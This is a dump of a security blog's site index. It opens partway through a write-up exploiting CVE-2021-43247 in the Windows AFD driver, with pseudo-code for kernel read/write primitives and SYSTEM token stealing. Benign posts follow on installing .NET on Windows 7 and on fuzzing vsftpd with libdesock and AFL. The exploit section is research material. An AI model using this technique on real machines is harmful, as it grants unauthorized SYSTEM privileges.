C:\\windows\\system32\\ntoskrnl.exe Microsoft (R) COFF/PE Dumper Version 14.28.29336.0 Copyright (C) Microsoft Corporation. All rights reserved. Dump of file C:\\windows\\system32\\ntoskrnl.exe File Type: EXECUTABLE IMAGE Section contains the following load config: \u0026lt;...\u0026gt; Guard CF Function Table Address -------- 0000000140200010 E 0000000140200050 00000001402000B0 00000001402001A0 E 0000000140200580 E 0000000140200940 E 00000001402009F0 0000000140200C40 00000001402010B0 00000001402010E0 0000000140201200 E 0000000140201750 E 0000000140201770 . . . Therefore, if the exploit is supposed to work even if CFG is enabled, we need to chose our target function as a valid CFG target.\nIRQL (Interrupt Request Level) One last detail that bears mentioning, is the Interrupt Request Level (IRQL). The interrupt Request level is a hardware feature that allows threads to specify what interrupts they are willing to accept. Importantly, if the IRQL is at \u0026gt;= 2 the thread is not allowed to page-fault anymore. This means that when the IRQL is at least two, the thread cannot access pageable memory anymore.\nPageable memory is memory that the Windows kernel reserves the right to spill to disk, if the system is running low on memory. If a thread would then access that memory a pagefault would occur and the Windows kernel would reload the page from disk.\nWhy is all this important? Well, it just so happens that the function we are overwriting is a \u0026ldquo;Completion Routine\u0026rdquo;. Completion Routines are supposed to run at IRQL = 2 and therefore might crash the system whenever they are accessing paged memory. All user space memory is paged and thus the exploit might crash when accessing user space memory. Further, not all kernel space functions are non-paged (though most are), further restricting the set of functions we can use in the exploit.\nIn reality, we are only interested in providing a proof of concept, so one could just ignore the the fact that the exploit crashes sometimes, but we actually have a solution:\nSometimes, when the kernel uses a piece of user space memory, it uses so called Memory Descriptor Lists (MDL) . When such a list is \u0026ldquo;locked\u0026rdquo;, the kernel will never page out the memory. Therefore, we just have to make some request, that will \u0026ldquo;lock\u0026rdquo; an MDL for the user space memory we are using and then we can reliably use it at IRQL = 2.\nPrimitives So, we have control over rip and rcx and can call some exported kernel functions, but what is the plan? Roughly, we want to obtain exploit primitives which allow us to read and write kernel memory:\nu64 read_u64(u64 kernel_address); void write_u64(u64 kernel_address, u64 value); These will later be used to give our process administrator privileges using a generalized exploit algorithm.\nWe construct these primitives by using the vulnerability with an exported kernel function. The perfect kernel function for a read primitive would look something like this:\nvoid read_function(struct read_argument *read){ read-\u0026gt;value = read-\u0026gt;pointer-\u0026gt;value; } And the perfect write function would look something like this:\nvoid write_function(struct write_argument *write){ *write-\u0026gt;pointer = write-\u0026gt;value; } Here the read/write argument would be a pointer to user space memory. This means we have full control of the value of read-\u0026gt;pointer and write-\u0026gt;pointer, respectively. These pointers then get dereferenced and either written to the controlled write-\u0026gt;value or read and stored back into user space memory.\nIf one cannot find primitives as perfect as these, one can search for functions that spread the first argument. The perfect spread function would be something like:\nvoid spread_function(struct arguments *arguments){ (*arguments-\u0026gt;function)(arguments-\u0026gt;argument_1, arguments-\u0026gt;argument_2, arguments-\u0026gt;argument_3, arguments-\u0026gt;argument_4); } Using the perfect spread function one could obtain a read/write function as follows:\nvoid read_write_function_called_by_spread_function( struct argument_1 *arg_1, struct argument_2 *arg_2){ arg_1-\u0026gt;value = arg_2-\u0026gt;value; } In practice, we used two spread functions and then different read and write functions.\nWindows Exploitation tricks and the general exploit algorithm The exploitation algorithm we are using is called \u0026ldquo;Token Stealing\u0026rdquo;. You can find a lot of information on it online. But we will give a short overview.\nEvery process has an internal _EPROCESS kernel structure. The access rights of the process are contained in an internal kernel structure called _TOKEN. The _EPROCESS structure references this token, by pointer.\nkd\u0026gt; dt nt!_EPROCESS Token +0x358 Token : _EX_FAST_REF kd\u0026gt; nt!_EX_FAST_REF +0x000 Object : Ptr64 Void +0x000 RefCnt : Pos 0, 4 Bits +0x000 Value : Uint8B Now, if we control the _TOKEN, we have control of all access rights. One option would be to use the read and write primitive to directly alter the access token, but in this case there is a simpler way. If we can locate a process which has SYSTEM access rights, we can simply copy the _TOKEN-pointer of the SYSTEM process into the _EPROCESS-\u0026gt;Token of our process. And it just so happens that the kernel exports a pointer to the nt!PsInitialSystemProcess which has SYSTEM access rights.\nTherefore, the basic algorithm would be\nUse the read primitive to read the value of (nt!PsInitialSystemProcess)-\u0026gt;Token Use the write primitive to write the value to our _EPROCESS-\u0026gt;Token field. But 2 problems remain:\nAs the _EPROCESS structure is undocumented and subject to change, the offset of the Token field varies by kernel version. We do not know where our _EPROCESS structure is. This is where Windows is really helpful again. Just as we can find all base addresses of kernel modules using NtQuerySystemInformation(SystemModuleInformation), we can find the address of both our _EPROCESS structure (solving 2) and our _TOKEN structure using NtQuerySystemInformation(SystemHandleInformation). Now, using the read primitive, we can iterate through our _EPROCESS structure and locate the _TOKEN structure. This then gives us the offset of the Token field.\nPutting it all together in pseudo-code, it looks something like this:\n// Use the Windows API to get all the information we want. token, process := find_token_and_process_using_NtQuerySystemInformation(); PsInitialSystemProcess_export, read_function, write_function := find_exported_symbols_using_NtQuerySystemInformation(); // Use a system call that is more or less equivalent to // `socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)` socket_handle := NtCreateFile(\u0026#34;\\\\Device\\\\Afd\u0026#34;, EaBuffer = {AF_INET, SOCK_STREAM, IPPROTO_TCP}); // use the system call that is equivalent to // `setsockopt(socket, IPPROTO_TCP, TCP_FASTOPEN, \u0026amp;(u32){1}, 1)` NtDeviceIoControlFile(socket_handle, 0x120bf, .input_buffer = {SetSockOpt, .level = IPPROTO_TCP, .option = TCP_FASTOPEN, .optval = \u0026amp;(u32){1}, .optlen = 1}); // use the system call that is equivalent to // `bind(socket, \u0026amp;(struct sockaddr){AF_INET}, sizeof(struct sockaddr))` NtDeviceIoControlFile(socket_handle, 0x12003, ...); // The read and write primitives now work by triggering the vulnerability by calling // `AfdSuperConnect` through the `NtDeviceIoControlFile`. function u64 read_u64(u64 address): read_argument := {.pointer = address}; NtDeviceIoControlFile(socket_handle, 0x120c7, .input_buffer = {.sockaddr = {AF_INET, .offset_0x5c = read_function, .offset_0x64 = \u0026amp;read_argument}}); return read_argument.value; function void write_u64(u64 address, u64 value): write_argument := {.pointer = address, .value = value}; NtDeviceIoControlFile(socket_handle, 0x120c7, .input_buffer = {.sockaddr = {AF_INET, .offset_0x5c = write_function, .offset_0x64 = \u0026amp;write_argument}}); // figure out the token_offset, by linearly scanning through our `_EPROCESS` for i from 0 to 0x1000: maybe_token := read_u64(process + i * 8); if maybe_token == token: token_offset = i * 8; break; // figure out the `_TOKEN` of `nt!PsInitialSystemProcess` PsInitialSystemProcess = read_u64(PsInitialSystemProcess_export); PsInitialSystemProcessToken = read_u64(PsInitialSystemProcess + token_offset); // actually steal the access `_TOKEN` to give us complete access rights. write_u64(token + token_offset, PsInitialSystemProcessToken); // spawn a shell to keep the access rights in a clean way. spawn_shell(); ","permalink":"https://lolcads.github.io/posts/2022/06/exploiting_cve_2021_43247/","tags":["Windows","kernel","LPE"],"title":"Exploiting CVE-2021-43247"},{"categories":null,"content":"Installing new .NET versions on a Windows 7 VM In this post, I will explain how to install .NET Framework 4.8 on a Windows 7 VM.\nMotivation Virtual Machines running Microsoft Windows are frequently used for dynamic analysis of Windows executables. Windows 7 is still used for analysis VM, although it is no longer supported by Microsoft and ships with an outdated .NET version. If a sample requires a .NET version which is not present on the analysis VM, the execution fails and the file cannot be analysed. For this reason it might be required to install a recent .NET version on a Windows 7 VM.\nProblem The .NET Framework 4.8 installer tries to verify the integritiy of the installation data prior to the installation. However, the root certificates required for this verification process are not present on Windows 7. This issue cannot be fixed via Windows updates, as they are not available for Windows 7 anymore.\nSolution First, download the offline installer for .NET Framework 4.8 Execute the file. This will extract the installation data into a temporary subfolder of C:\\ with a random name. Wait until the extraction process has finished and an installer opens. You don\u0026rsquo;t have to interact with this installer window at all. Just leave it opened to prevent the deletion of the temporary subfolder. Next, navigate to the temporary folder and execute the file netfx_Full_x64.msi or netfx_Full_x86.msi. This will trigger the installation of .NET Framework 4.8. Restart the system after the installation finished. That\u0026rsquo;s it, you\u0026rsquo;re all set! :)\n","permalink":"https://lolcads.github.io/posts/2022/03/win7_dotnet_install/","tags":["Win7",".NET","dynamic analysis"],"title":"Installing new .NET versions on a Windows 7 VM"},{"categories":null,"content":"Fuzzing Network Applications with AFL and libdesock Fuzzing network servers with AFL is challenging since AFL provides its input via stdin or command line arguments while servers get their input over network connections. As the popularity of AFL grew, many attempts have been made of fuzzing popular servers like apache and nginx using different techniques and hacky workarounds. However an off-the-shelf network fuzzing solution for AFL didn\u0026rsquo;t exist for a long time until so-called \u0026ldquo;desocketing\u0026rdquo; tools emerged. These desocketing tools enabled network fuzzing without making a lot of additional modifications to the program under test and quickly became widely used in combination with AFL.\nWhat is \u0026ldquo;desocketing\u0026rdquo;? Before desocketing tools were published two common techniques for network fuzzing were\nSending fuzz input over real network connections Modifying the target source to use stdin instead of sockets The first approach is the most prevalent used by popular fuzzers like boofuzz or in academia by AFLnet or StateAFL . This however suffers performance- and stability-drawbacks. Stability is affected because the servers run with all threads and child processes enabled. Background threads can be scheduled independently from the input being sent resulting in invalid coverage information. Performance is affected because of the amount of kernel activity and network overhead involved.\nThe second approach solves the network overhead problem but does not reduce the kernel activity. It also takes a considerable amount of effort that may lead to changing thousands of lines of code .\nDesocketing aims to reduce kernel activity and the amount of modifications necessary to a program. It works by building a shared library that implements functions like socket() and accept() and preloading it via LD_PRELOAD into the address space of a network application where it replaces the network stack of the libc. The desocketing library simulates incoming connections to the server but every read on a socket is replaced by a read on stdin and every write on a socket is redirected to stdout. Strictly speaking the latter isn\u0026rsquo;t necessary for fuzzing but it\u0026rsquo;s useful for debugging.\nThe following figure demonstrates how to desock nginx such that the network traffic becomes visible on a terminal.\nHow desocketing works Making desocketing libraries has its complexities. AFLplusplus\u0026rsquo; socketfuzz ships a desocketing library that just returns 0 (stdin) in accept(). Unfortunately this doesn\u0026rsquo;t quite work because send() and recv() need an fd that actually refers to a network connection. If you pass them an fd that refers to a file the kernel will complain. Thus we need more complicated methods.\nAt the time of writing this, there exists only one popular desocketing solution: preeny . preeny creates a socketpair (a,b) and spawns two threads t1 andt2 in every call to socket().\nThread t1 forwards all data from stdin to a Thread t2 forwards all data from a to stdout In socket() preeny returns b When AFL writes input to stdin, thread t1 forwards that data to a Writing to a means that the data will become available in b and the application can read the request from b The application writes a response back to b, making the data available in socket a where t2 forwards it to stdout. Unfortunately this design makes preeny unsuitable for fuzzing:\nSpawning threads and joining them introduces additional overhead. Each thread realizes busy waiting by calling poll() every 15ms Preeny still relies on a lot of kernel interaction. I/O multiplexing (select, poll, epoll) is left completely to the kernel. The threads may introduce additional instability.\nNormally you want to disable threads when fuzzing with AFL. It can handle only single-threaded applications but most of the servers are multi-threaded A better desocketing library is needed that is more resource-efficient and handles the complexities of modern network applications correctly. So we created a new desocketing library: \u0026ldquo;libdesock\u0026rdquo;.\nUsing libdesock libdesock fully emulates the network stack of the kernel. The kernel is only queried to obtain file descriptors and to do I/O on stdin and stdout. Everything else - handling of connections, I/O multiplexing (select, poll, epoll), handling socket metadata (getsockname, getpeername) - entierly happens in userland.\nIn contrast to preeny, libdesock supports multi-threaded applications and its overall design makes it more resource efficient and 5x faster than preeny. This has no effect on AFL\u0026rsquo;s exec/s though, since that primarily depends on the program and the input.\nWe have tested libdesock on common network daemons like\nnginx Apache httpd OpenSSH Exim bind9 OpenVPN Redis dnsmasq cupsd curl (clients are supported too) and several smaller applications.\nlibdesock also supports event libraries like\nlibevent libuv libapr-2 Network applications generally are very complex and require modifications to be fuzzable with AFL.\nThey use multiple processes and threads, encryption, compression, checksums, hashes and sometimes custom allocators that don\u0026rsquo;t work with ASAN. They also run in an endless loop and have a lot of disk I/O (pidfiles, logfiles, temporary files). Setting these targets up for fuzzing means to reduce the complexity of the applications. The following example demonstrates the modifications necessary to fuzz vsftpd , a popular FTP server on Linux.\nFuzzing vsftpd Getting the source Download version 3.0.5 of vsftpd:\nwget https://security.appspot.com/downloads/vsftpd-3.0.5.tar.gz tar -xf vsftpd-3.0.5.tar.gz cd vsftpd-3.0.5 Patching the source vsftpd creates a new child process for each connection. We prohibit that by commenting out the code that does the fork in standalone.c:\n@@ -153,6 +153,7 @@ vsf_standalone_main(void) child_info.num_this_ip = 0; p_raw_addr = vsf_sysutil_sockaddr_get_raw_addr(p_accept_addr); child_info.num_this_ip = handle_ip_count(p_raw_addr); + /* if (tunable_isolate) { if (tunable_http_enable \u0026amp;\u0026amp; tunable_isolate_network) @@ -168,6 +169,8 @@ vsf_standalone_main(void) { new_child = vsf_sysutil_fork_failok(); } + */ + new_child = 0; if (new_child != 0) { /* Parent context */ vsftpd duplicates the FTP command socket to stdin, stdout and stderr. This obviously interfers with AFL so we disable that in defs.h \u0026hellip;\n@@ -3,7 +3,7 @@ #define VSFTP_DEFAULT_CONFIG \u0026#34;/etc/vsftpd.conf\u0026#34; -#define VSFTP_COMMAND_FD 0 +#define VSFTP_COMMAND_FD 29 #define VSFTP_PASSWORD_MAX 128 #define VSFTP_USERNAME_MAX 128 \u0026hellip; and in standalone.c\n@@ -205,9 +205,7 @@ static void prepare_child(int new_client_sock) { /* We must satisfy the contract: command socket on fd 0, 1, 2 */ - vsf_sysutil_dupfd2(new_client_sock, 0); - vsf_sysutil_dupfd2(new_client_sock, 1); - vsf_sysutil_dupfd2(new_client_sock, 2); + vsf_sysutil_dupfd2(new_client_sock, VSFTP_COMMAND_FD); if (new_client_sock \u0026gt; 2) { vsf_sysutil_close(new_client_sock); Next, vsftpd enforces a custom memory limit that interfers with ASAN. We disable the memory limit in sysutil.c\n@@ -2793,6 +2793,7 @@ void vsf_sysutil_set_address_space_limit(unsigned long bytes) { /* Unfortunately, OpenBSD is missing RLIMIT_AS. */ + return; #ifdef RLIMIT_AS int ret; struct rlimit rlim; Then we add a forkserver to vsftpd in prelogin.c\n@@ -59,6 +59,7 @@ init_connection(struct vsf_session* p_sess) { emit_greeting(p_sess); } + __AFL_INIT(); parse_username_password(p_sess); } vsftpd registers a SIGCHLD handler that interfers with the forkserver so we have to disable that too in standalone.c\n@@ -74,7 +74,7 @@ vsf_standalone_main(void) { vsf_sysutil_setproctitle(\u0026#34;LISTENER\u0026#34;); } - vsf_sysutil_install_sighandler(kVSFSysUtilSigCHLD, handle_sigchld, 0, 1); + //vsf_sysutil_install_sighandler(kVSFSysUtilSigCHLD, handle_sigchld, 0, 1); vsf_sysutil_install_sighandler(kVSFSysUtilSigHUP, handle_sighup, 0, 1); if (tunable_listen) { Last but not least we disable the bug() function in utility.c. This function does a failing fcntl() on an fd returned by the desocketing library since the fd is not a real socket. vsftpd handles the fcntl() failure by calling bug() again leading to an infinite loop.\n@@ -40,6 +40,7 @@ die2(const char* p_text1, const char* p_text2) void bug(const char* p_text) { + return; /* Rats. Try and write the reason to the network for diagnostics */ vsf_sysutil_activate_noblock(VSFTP_COMMAND_FD); (void) vsf_sysutil_write_loop(VSFTP_COMMAND_FD, \u0026#34;500 OOPS: \u0026#34;, 10); Build configuration In the Makefile replace:\n@@ -1,16 +1,16 @@ # Makefile for systems with GNU tools -CC =\tgcc +CC =\tafl-clang-fast INSTALL\t=\tinstall IFLAGS = -idirafter dummyinc #CFLAGS = -g -CFLAGS\t=\t-O2 -fPIE -fstack-protector --param=ssp-buffer-size=4 \\ -\t-Wall -W -Wshadow -Werror -Wformat-security \\ +CFLAGS\t=\t-fsanitize=address -g -Og -fPIE -fstack-protector \\ +\t-Wall -W -Wshadow -Wformat-security \\ -D_FORTIFY_SOURCE=2 \\ #-pedantic -Wconversion LIBS\t=\t`./vsf_findlibs.sh` -LINK\t=\t-Wl,-s -LDFLAGS\t=\t-fPIE -pie -Wl,-z,relro -Wl,-z,now +LINK\t=\t+LDFLAGS\t=\t-fPIE -pie -Wl,-z,relro -Wl,-z,now -fsanitize=address OBJS\t=\tmain.o utility.o prelogin.o ftpcmdio.o postlogin.o privsock.o \\ tunables.o ftpdataio.o secbuf.o ls.o \\ Runtime configuration Like most other servers, vsftpd needs a config file. Createfuzz.conf with the following contents:\nlisten=YES seccomp_sandbox=NO one_process_model=YES # User management anonymous_enable=YES no_anon_password=YES nopriv_user=nobody # Permissions connect_from_port_20=NO run_as_launching_user=YES listen_port=2121 listen_address=127.0.0.1 pasv_address=127.0.0.1 # Filesystem interactions write_enable=NO download_enable=NO Start fuzzing To use the desocketing library with AFL we need to set the AFL_PRELOAD variable.\nexport AFL_PRELOAD=libdesock.so afl-fuzz -i corpus -o findings -m none -- ./vsftpd fuzz.conf Now it\u0026rsquo;s only a matter of high-quality custom mutators and time to find some bugs.\nlibdesock can be downloaded here: https://github.com/fkie-cad/libdesock ","permalink":"https://lolcads.github.io/posts/2022/02/libdesock/","tags":["fuzzing","network","sockets","emulation"],"title":"libdesock"},{"categories":null,"content":"Written in Go, Hugo is an open source static site generator available under the Apache Licence 2.0. Hugo supports TOML, YAML and JSON data file types, Markdown and HTML content files and uses shortcodes to add rich content. Other notable features are taxonomies, multilingual mode, image processing, custom output formats, HTML/CSS/JS minification and support for Sass SCSS workflows.\nHugo makes use of a variety of open source projects including:\nhttps://github.com/yuin/goldmark https://github.com/alecthomas/chroma https://github.com/muesli/smartcrop https://github.com/spf13/cobra https://github.com/spf13/viper Hugo is ideal for blogs, corporate websites, creative portfolios, online magazines, single page applications or even a website with thousands of pages.\nHugo is for people who want to hand code their own website without worrying about setting up complicated runtimes, dependencies and databases.\nWebsites built with Hugo are extremelly fast, secure and can be deployed anywhere including, AWS, GitHub Pages, Heroku, Netlify and any other hosting provider.\nLearn more and contribute on GitHub .\n","permalink":"https://lolcads.github.io/example/","tags":null,"title":"About"},{"categories":null,"content":"","permalink":"https://lolcads.github.io/manifest.json","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.es/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.fr/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.hi/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.jp/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.pl/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.ru/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.zh-cn/","tags":null,"title":""},{"categories":null,"content":"This is a tech blog of loosly coupled individuals that like to sometimes play CTFs but mostly just have fun with deeply technical topics such as (malware) reverse engineering, fuzzing, vulnerability research, forensics, \u0026hellip; We hope you will find some valuable information on our site :) Get in touch if you want via Contact .\n","permalink":"https://lolcads.github.io/about/","tags":null,"title":"About"},{"categories":null,"content":"You can reach us at: Feel free to use our PGP key (fingerprint: CCD8 D75E 9A10 6BF4 3668 AB99 7E64 EF83 D585 CECA)\nYou can also report any issues (dead links, problems, \u0026hellip;) via GitHub: https://github.com/lolcads/lolcads.github.io/issues ","permalink":"https://lolcads.github.io/contact/","tags":null,"title":"Contact"}]